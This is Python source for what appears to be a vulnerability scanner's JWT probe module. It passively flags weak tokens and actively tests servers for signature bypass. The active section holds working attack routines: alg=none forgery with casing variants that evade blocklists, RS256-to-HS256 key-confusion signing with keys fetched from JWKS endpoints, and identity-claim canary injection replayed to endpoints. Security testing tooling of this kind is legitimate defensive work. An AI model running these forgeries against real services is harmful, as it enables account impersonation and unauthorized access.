import base64
import copy
import json
import logging
import re
import time
from urllib.parse import urlparse

from app.core.detectors.base_detector import Finding
from shared.models.vulnerability import SeverityLevel

logger = logging.getLogger("app.core.detectors.auth_detector")


class JwtAuthProbeMixin:
    @staticmethod
    def _looks_like_jwt(token: str) -> bool:
        parts = token.split(".")
        return len(parts) == 3 and all(parts[:2]) and len(token) > 40
    @staticmethod
    def _b64url_decode_json(segment: str) -> dict | None:
        try:
            padded = segment + "=" * (-len(segment) % 4)
            decoded = base64.urlsafe_b64decode(padded.encode("ascii"))
            parsed = json.loads(decoded.decode("utf-8"))
        except Exception:
            return None
        return parsed if isinstance(parsed, dict) else None

    def _decode_jwt(self, token: str) -> tuple[dict, dict] | None:
        if not self._looks_like_jwt(token):
            return None
        header_segment, payload_segment, _signature = token.split(".", 2)
        header = self._b64url_decode_json(header_segment)
        payload = self._b64url_decode_json(payload_segment)
        if header is None or payload is None:
            return None
        return header, payload

    @staticmethod
    def _extract_bearer(headers: dict) -> str | None:
        for key, value in (headers or {}).items():
            if key.lower() == "authorization":
                match = re.match(r"Bearer\s+(.+)", str(value), re.I)
                if match:
                    return match.group(1).strip()
        return None

    def _tokens_from_context(self, kwargs: dict[str, object], session_cookies: dict) -> list[dict]:
        tokens: list[dict] = []
        auth_headers = dict(kwargs.get("auth_headers") or {})
        bearer = self._extract_bearer(auth_headers)
        if bearer:
            tokens.append({"token": bearer, "source": "auth_headers.Authorization", "url": str(kwargs.get("root_url") or "")})

        for name, value in (session_cookies or {}).items():
            if self._looks_like_jwt(str(value)):
                tokens.append({"token": str(value), "source": f"session_cookie.{name}", "url": str(kwargs.get("root_url") or "")})

        for request in kwargs.get("requests") or []:
            request_headers = getattr(request, "request_headers", {}) or {}
            bearer = self._extract_bearer(dict(request_headers))
            if bearer:
                tokens.append({"token": bearer, "source": "observed_request.Authorization", "url": getattr(request, "url", "")})
            cookie_header = next((v for k, v in dict(request_headers).items() if k.lower() == "cookie"), "")
            for cookie_part in str(cookie_header).split(";"):
                if "=" not in cookie_part:
                    continue
                name, value = [part.strip() for part in cookie_part.split("=", 1)]
                if self._looks_like_jwt(value):
                    tokens.append({"token": value, "source": f"observed_request.cookie.{name}", "url": getattr(request, "url", "")})

        seen: set[str] = set()
        unique: list[dict] = []
        for item in tokens:
            if item["token"] in seen:
                continue
            seen.add(item["token"])
            unique.append(item)
        return unique

    def _jwt_findings(self, kwargs: dict[str, object], session_cookies: dict) -> list[Finding]:
        # JWT weaknesses are a server token-policy issue, not an endpoint-specific
        # one. Aggregate per (host, vuln_type) so a single policy gap is reported
        # once per host instead of fanning out across every URL/token that carried it.
        now = int(time.time())
        sensitive_claim_terms = (
            "password", "passwd", "pwd", "secret", "api_key", "apikey", "private_key",
            "reset_token", "refresh_token", "access_token", "hash",
        )
        root_url = str(kwargs.get("root_url") or "")

        decoded_tokens: list[dict] = []
        for item in self._tokens_from_context(kwargs, session_cookies):
            decoded = self._decode_jwt(item["token"])
            if not decoded:
                continue
            header, payload = decoded
            url = str(item.get("url") or root_url)
            decoded_tokens.append({
                "header": header,
                "payload": payload,
                "source": str(item.get("source") or "jwt"),
                "url": url,
                "host": urlparse(url).netloc,
            })

        groups: dict[tuple[str, str], dict] = {}

        def _add(
            host: str,
            vuln_type: str,
            severity: SeverityLevel,
            evidence: str,
            detection_method: str,
            confidence: float,
            token: dict,
            extra: dict,
        ) -> None:
            key = (host, vuln_type)
            group = groups.get(key)
            if group is None:
                group = {
                    "vuln_type": vuln_type,
                    "severity": severity,
                    "evidence": evidence,
                    "detection_method": detection_method,
                    "confidence_score": confidence,
                    "sources": [],
                    "urls": [],
                    "claim_sets": [],
                    "extras": [],
                }
                groups[key] = group
            if token["source"] not in group["sources"]:
                group["sources"].append(token["source"])
            if token["url"] not in group["urls"]:
                group["urls"].append(token["url"])
            claim_set = sorted(token["payload"].keys())
            if claim_set not in group["claim_sets"]:
                group["claim_sets"].append(claim_set)
            group["extras"].append(extra)

        for token in decoded_tokens:
            header = token["header"]
            payload = token["payload"]
            host = token["host"]
            alg = str(header.get("alg", "")).lower()
            if alg == "none":
                _add(
                    host,
                    "JWT Uses alg=none",
                    SeverityLevel.critical,
                    "Bearer/session JWT declares alg=none, meaning signature verification may be disabled.",
                    "jwt_metadata_inspection",
                    95.0,
                    token,
                    {"header": header},
                )

            exp = payload.get("exp")
            if exp is None:
                _add(
                    host,
                    "JWT Missing Expiration Claim",
                    SeverityLevel.high,
                    "Bearer/session JWT has no exp claim, so token lifetime cannot be bounded by the token itself.",
                    "jwt_claim_inspection",
                    85.0,
                    token,
                    {"claims": sorted(payload.keys())},
                )
            else:
                try:
                    exp_int = int(exp)
                    iat_int = int(payload.get("iat", now))
                    if exp_int - iat_int > 60 * 60 * 24 * 30 or exp_int - now > 60 * 60 * 24 * 30:
                        _add(
                            host,
                            "JWT Expiration Is Excessively Long",
                            SeverityLevel.medium,
                            "Bearer/session JWT remains valid for more than 30 days.",
                            "jwt_claim_inspection",
                            80.0,
                            token,
                            {"exp": exp_int, "iat": payload.get("iat")},
                        )
                except Exception:
                    pass

            sensitive_claims = [
                key for key in payload.keys()
                if any(term in str(key).lower() for term in sensitive_claim_terms)
            ]
            if sensitive_claims:
                _add(
                    host,
                    "JWT Contains Sensitive Claims",
                    SeverityLevel.high,
                    f"JWT payload exposes sensitive claim names: {sorted(sensitive_claims)}.",
                    "jwt_sensitive_claim_inspection",
                    90.0,
                    token,
                    {"sensitive_claims": sorted(sensitive_claims)},
                )

        findings: list[Finding] = []
        for (host, vuln_type), group in groups.items():
            rep_url = (
                root_url
                if root_url and urlparse(root_url).netloc == host
                else (group["urls"][0] if group["urls"] else root_url)
            )
            detection_evidence: dict = {
                "sources": group["sources"],
                "urls": group["urls"],
                "claim_sets": group["claim_sets"],
            }
            if vuln_type == "JWT Uses alg=none":
                detection_evidence["headers"] = [
                    e["header"] for e in group["extras"] if e.get("header") is not None
                ]
            elif vuln_type == "JWT Expiration Is Excessively Long":
                detection_evidence["exp_values"] = [
                    e["exp"] for e in group["extras"] if e.get("exp") is not None
                ]
                detection_evidence["iat_values"] = [
                    e["iat"] for e in group["extras"] if e.get("iat") is not None
                ]
            elif vuln_type == "JWT Contains Sensitive Claims":
                detection_evidence["sensitive_claims"] = sorted(
                    {s for e in group["extras"] for s in (e.get("sensitive_claims") or [])}
                )

            evidence = group["evidence"]
            if len(group["sources"]) > 1:
                evidence += (
                    f" Observed across {len(group['sources'])} token source(s) on host {host}."
                )

            findings.append(
                self._finding(
                    vuln_type=vuln_type,
                    url=rep_url,
                    severity=group["severity"],
                    evidence=evidence,
                    verified=True,
                    detection_method=group["detection_method"],
                    confidence_score=group["confidence_score"],
                    detection_evidence=detection_evidence,
                )
            )
        return findings

    # ---------------------------------------------------------------------------
    # Active JWT forgery
    # ---------------------------------------------------------------------------
    @staticmethod
    def _b64url(raw: bytes) -> str:
        return base64.urlsafe_b64encode(raw).decode("ascii").rstrip("=")

    # Standard JWT identity claim names (RFC 7519 + common vendor claims). Used to
    # substitute a canary so a reflected forged identity is undeniable proof. Generic
    # — no target-specific claim names.
    _IDENTITY_CLAIM_KEYS = frozenset({
        "email", "mail", "e-mail", "sub", "username", "user", "user_name",
        "preferred_username", "name", "login", "uid", "upn", "unique_name",
        "nameid", "id", "userid", "user_id", "account", "role", "roles",
    })

    def _unsigned_token(self, header: dict, payload: dict, alg: str = "none") -> str:
        payload_segment = self._b64url(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
        header_segment = self._b64url(json.dumps({**header, "alg": alg}, separators=(",", ":")).encode("utf-8"))
        return f"{header_segment}.{payload_segment}."

    def _forge_alg_none(self, header: dict, payload: dict) -> list[tuple[str, str]]:
        """Forge unsigned tokens for the payload across alg=none casing variants.

        A JWT library that honours ``alg:none`` accepts a token with an empty
        signature. Casing variants defeat naive blocklists that only reject the
        exact lowercase string. Returns ``(label, token)`` pairs.
        """
        return [
            (f"alg={variant}", self._unsigned_token(header, payload, variant))
            for variant in ("none", "None", "NONE", "nOnE")
        ]

    def _inject_canary(self, payload: dict, canary: str) -> dict | None:
        """Deep-copy *payload* with a canary substituted into identity claims.

        Returns the mutated payload when at least one identity claim was replaced,
        else ``None``. Reflecting this canary back proves the server both accepted an
        unsigned token AND trusted its (attacker-chosen) identity claims.
        """
        clone = copy.deepcopy(payload)
        count = 0

        def walk(node: object) -> None:
            nonlocal count
            if isinstance(node, dict):
                for key, value in list(node.items()):
                    if isinstance(value, str) and str(key).lower() in self._IDENTITY_CLAIM_KEYS:
                        node[key] = canary
                        count += 1
                    else:
                        walk(value)
            elif isinstance(node, list):
                for value in node:
                    walk(value)

        walk(clone)
        return clone if count else None

    def _forge_key_confusion(self, header: dict, payload: dict, public_key_pem: str) -> str | None:
        """Forge an HS256 token signed with the server's RSA public key as the HMAC secret.

        Algorithm-confusion: a server that verifies with ``jwt.verify(token, publicKey)``
        while allowing symmetric algorithms will validate an HS256 token whose MAC
        key is the (public) PEM it also uses to verify RS256. Generic to any RSA-JWT
        service whose public key is obtainable via standard discovery.
        """
        try:
            import jwt as pyjwt  # PyJWT

            new_header = {key: value for key, value in header.items() if key.lower() != "alg"}
            return pyjwt.encode(
                payload,
                key=public_key_pem,
                algorithm="HS256",
                headers={**new_header, "alg": "HS256"},
            )
        except Exception:
            return None

    @staticmethod
    def _jwks_to_pems(jwks: object) -> list[str]:
        """Convert RSA keys in a JWKS document to PEM public keys (best-effort)."""
        pems: list[str] = []
        keys = jwks.get("keys", []) if isinstance(jwks, dict) else []
        for jwk in keys if isinstance(keys, list) else []:
            if not isinstance(jwk, dict) or jwk.get("kty") != "RSA" or "n" not in jwk or "e" not in jwk:
                continue
            try:
                from cryptography.hazmat.primitives import serialization
                from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers

                def _int(segment: str) -> int:
                    padded = segment + "=" * (-len(segment) % 4)
                    return int.from_bytes(base64.urlsafe_b64decode(padded.encode("ascii")), "big")

                public_key = RSAPublicNumbers(_int(jwk["e"]), _int(jwk["n"])).public_key()
                pem = public_key.public_bytes(
                    serialization.Encoding.PEM,
                    serialization.PublicFormat.SubjectPublicKeyInfo,
                ).decode("ascii")
                pems.append(pem)
            except Exception:
                continue
        return pems
    async def _fetch_jwks_pems(self, kwargs: dict[str, object], verifier: object) -> list[str]:
        """Discover RSA public keys via STANDARD JWKS endpoints only (no app paths)."""
        root_url = str(kwargs.get("root_url") or "")
        if not root_url:
            return []
        parsed = urlparse(root_url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        pems: list[str] = []
        for path in ("/.well-known/openid-configuration", "/.well-known/jwks.json"):
            try:
                resp = await verifier.send_request(
                    base + path, "GET", None, None,
                    test_phase="jwt_jwks_discovery", module="auth",
                )
                if not (200 <= getattr(resp, "status_code", 0) < 300):
                    continue
                document = json.loads(getattr(resp, "body", "") or "{}")
            except Exception:
                continue
            jwks = document
            if isinstance(document, dict) and document.get("jwks_uri"):
                try:
                    resp2 = await verifier.send_request(
                        str(document["jwks_uri"]), "GET", None, None,
                        test_phase="jwt_jwks_fetch", module="auth",
                    )
                    jwks = json.loads(getattr(resp2, "body", "") or "{}")
                except Exception:
                    continue
            pems.extend(self._jwks_to_pems(jwks))
        # De-duplicate while preserving order.
        seen: set[str] = set()
        unique: list[str] = []
        for pem in pems:
            if pem not in seen:
                seen.add(pem)
                unique.append(pem)
        return unique

    # Generic REST/English conventions for identity-reflecting endpoints. Used only
    # to RANK candidates so the limited oracle budget is spent on the endpoints most
    # likely to be a forgery oracle — NOT to gate detection (any endpoint that shows
    # an auth differential still qualifies). Contains no target-specific paths.
    _IDENTITY_PATH_TOKENS = (
        "whoami", "userinfo", "me", "self", "current", "profile", "account",
        "session", "identity", "user", "users", "member", "principal", "dashboard",
    )
    # Generic static-asset markers: an asset can never be an auth oracle.
    _STATIC_ASSET_EXTS = frozenset({
        "js", "mjs", "css", "scss", "map", "png", "jpg", "jpeg", "gif", "svg",
        "ico", "webp", "woff", "woff2", "ttf", "eot", "otf",
    })
    _STATIC_ASSET_DIRS = ("/assets/", "/static/", "/i18n/", "/fonts/", "/images/", "/img/")

    @classmethod
    def _is_static_asset(cls, url: str) -> bool:
        path = urlparse(url).path.lower()
        if any(seg in path for seg in cls._STATIC_ASSET_DIRS):
            return True
        last = path.rsplit("/", 1)[-1]
        if "." in last:
            return last.rsplit(".", 1)[-1] in cls._STATIC_ASSET_EXTS
        return False

    def _token_carriers_from_request(self, request: object) -> list[dict]:
        """How a JWT was presented on an observed request (header and/or cookie).

        Returns carrier descriptors ``{loc, name, scheme, token}`` so a forged token
        can later be replayed in the SAME location the application actually reads it
        from. Framework-agnostic: covers ``Authorization: Bearer`` headers and any
        cookie whose value is JWT-shaped (the common SPA pattern).
        """
        carriers: list[dict] = []
        headers = dict(getattr(request, "request_headers", {}) or {})
        bearer = self._extract_bearer(headers)
        if bearer and self._looks_like_jwt(bearer):
            carriers.append({"loc": "header", "name": "Authorization", "scheme": "Bearer ", "token": bearer})

        cookies = dict(getattr(request, "request_cookies", {}) or {})
        if not cookies:
            cookie_header = next((v for k, v in headers.items() if k.lower() == "cookie"), "")
            for part in str(cookie_header).split(";"):
                if "=" in part:
                    name, value = part.split("=", 1)
                    cookies[name.strip()] = value.strip()
        for name, value in cookies.items():
            if self._looks_like_jwt(str(value)):
                carriers.append({"loc": "cookie", "name": str(name), "scheme": "", "token": str(value)})
        return carriers
    def _forgery_oracle_candidates(self, kwargs: dict[str, object]) -> list[dict]:
        """Observed GET endpoints that carried a JWT (header OR cookie), ranked.

        Static assets are dropped (never an auth oracle) and identity-reflecting
        endpoints are ranked first so the budgeted oracle probes land on the URLs
        most likely to expose a signature-verification bypass. The auth differential
        measured later — not this ranking — is what actually qualifies an oracle.
        """
        ranked: list[tuple[int, str, list[dict]]] = []
        seen: set[str] = set()
        for request in kwargs.get("requests") or []:
            if str(getattr(request, "method", "GET") or "GET").upper() != "GET":
                continue
            url = str(getattr(request, "url", "") or "")
            if not url or url in seen:
                continue
            if self._is_static_asset(url):
                continue
            carriers = self._token_carriers_from_request(request)
            if not carriers:
                continue
            seen.add(url)
            path = urlparse(url).path.lower()
            rank = 0 if any(tok in path for tok in self._IDENTITY_PATH_TOKENS) else 1
            ranked.append((rank, url, carriers))
        ranked.sort(key=lambda item: item[0])
        return [{"url": url, "carriers": carriers} for _rank, url, carriers in ranked[:6]]

    @staticmethod
    async def _send_via_carrier(verifier: object, url: str, token: str | None, carrier: dict, *, phase: str) -> object:
        """Send GET *url* presenting *token* (or nothing) in the carrier's location."""
        headers: dict | None = None
        cookies: dict | None = None
        if token is not None:
            if carrier.get("loc") == "cookie":
                cookies = {carrier["name"]: token}
            else:
                headers = {carrier.get("name", "Authorization"): f"{carrier.get('scheme', '')}{token}"}
        return await verifier.send_request(
            url, "GET", None, None,
            headers=headers, cookies=cookies,
            test_phase=phase, module="auth", parameter="jwt",
        )

    @staticmethod
    def _identity_signal_values(payload: object, authed_body: str, noauth_body: str) -> list[str]:
        """Token-derived identity markers reflected ONLY in the authenticated body.

        Walks the JWT payload for scalar leaf values (emails, usernames, numeric ids,
        etc.) and keeps those that appear in the authenticated response but NOT in the
        no-auth response. Such a value is a zero-FP "the server trusted this token's
        claims" signal: its later reappearance under a forged token proves acceptance,
        and its absence from the no-auth baseline rules out coincidental/public echo.
        """
        candidates: list[str] = []

        def walk(node: object) -> None:
            if isinstance(node, dict):
                for value in node.values():
                    walk(value)
            elif isinstance(node, list):
                for value in node:
                    walk(value)
            elif isinstance(node, bool):
                return
            elif isinstance(node, str):
                if len(node) >= 4:
                    candidates.append(node)
            elif isinstance(node, int):
                if node > 999:
                    candidates.append(str(node))

        walk(payload)
        signal: list[str] = []
        for value in candidates:
            if value in authed_body and value not in noauth_body and value not in signal:
                signal.append(value)
        return signal

    async def _establish_forgery_oracle(self, verifier: object, url: str, carriers: list[dict]) -> dict | None:
        """Confirm *url* distinguishes authed from unauthenticated, via ANY carrier.

        For each observed carrier (header / cookie), replays no-token vs the real
        token and looks for an auth differential by EITHER status code (401/403 → 2xx)
        OR body content (token identity claims reflected only when authenticated). The
        first carrier that shows a differential wins; returns the winning carrier plus
        the markers used to judge forgery acceptance. ``None`` when the endpoint is
        public / not a usable oracle. No session cookies are sent, so authentication
        is attributable solely to the presented token.
        """
        for carrier in carriers:
            base_token = carrier.get("token")
            if not base_token or not self._decode_jwt(base_token):
                continue
            no_auth = await self._send_via_carrier(verifier, url, None, carrier, phase="jwt_forgery_noauth")
            real = await self._send_via_carrier(verifier, url, base_token, carrier, phase="jwt_forgery_baseline")
            if getattr(no_auth, "not_tested", False) or getattr(real, "not_tested", False):
                continue

            noauth_status = getattr(no_auth, "status_code", 0)
            real_status = getattr(real, "status_code", 0)
            status_based = noauth_status in (401, 403) and 200 <= real_status < 300

            _header, payload = self._decode_jwt(base_token)
            signal_values = self._identity_signal_values(
                payload, getattr(real, "body", "") or "", getattr(no_auth, "body", "") or ""
            )

            if status_based or signal_values:
                return {
                    "carrier": carrier,
                    "base_token": base_token,
                    "real_status": real_status,
                    "noauth_status": noauth_status,
                    "status_based": status_based,
                    "signal_values": signal_values,
                }
        return None

    @staticmethod
    def _mask_marker(value: str) -> str:
        """Partially mask a reflected identity marker for evidence text."""
        value = str(value)
        if len(value) <= 6:
            return "…"
        return f"{value[:2]}…{value[-2:]}"

    def _judge_forgery(self, resp: object, oracle: dict, canary: str | None) -> dict | None:
        """Decide whether a forged token was accepted. Zero-FP by construction.

        A canary token counts only if the canary reflects (undeniable identity
        injection). An unchanged-payload token counts if it reproduces the authed
        response class: token-derived identity markers that were absent from the
        no-auth baseline reappear, or (for a status-gated oracle) it returns 2xx.
        """
        if getattr(resp, "not_tested", False):
            return None
        status = getattr(resp, "status_code", 0)
        body = getattr(resp, "body", "") or ""
        if canary is not None:
            if canary in body:
                return {"mode": "identity-injection", "markers": [canary], "status": status}
            return None
        hits = [v for v in oracle["signal_values"] if v in body]
        if hits:
            return {"mode": "identity-reflection", "markers": hits, "status": status}
        if oracle["status_based"] and 200 <= status < 300:
            return {"mode": "status-differential", "markers": [], "status": status}
        return None
